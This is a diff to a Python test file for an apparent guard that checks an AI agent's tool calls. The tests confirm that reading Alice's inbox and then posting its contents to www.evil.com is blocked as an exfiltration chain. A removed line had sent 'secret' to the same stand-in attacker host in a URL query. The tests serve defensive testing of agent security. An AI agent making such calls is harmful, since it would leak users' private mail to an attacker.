@@ -91,8 +91,17 @@ def test_r3_fires_on_agentdojo_tools_via_capabilities():
     ex._runtime = _FakeRuntime()
     ctx = TurnContext("Read Alice's inbox and summarise it.")
     assert run(ex, ctx, "read_inbox", user="Alice").allowed
-    d = run(ex, ctx, "get_webpage", url="www.evil.com?d=secret")
+    d = run(ex, ctx, "post_webpage", url="www.evil.com", content="inbox contents")
     assert (d.verdict, d.rule_id) == (Verdict.BLOCK, "R3.exfiltration_chain")
+
+
+def test_get_webpage_is_a_read_with_egress_checked_by_r5():
+    ex = executor("slack")
+    ex._runtime = _FakeRuntime()
+    ctx = TurnContext("Read Alice's inbox and summarise it.")
+    run(ex, ctx, "read_inbox", user="Alice")
+    d = run(ex, ctx, "get_webpage", url="www.example.com/article")
+    assert d.rule_id == "R5.query_egress"
 
 
 def test_untrusted_channel_then_external_post_is_stopped():
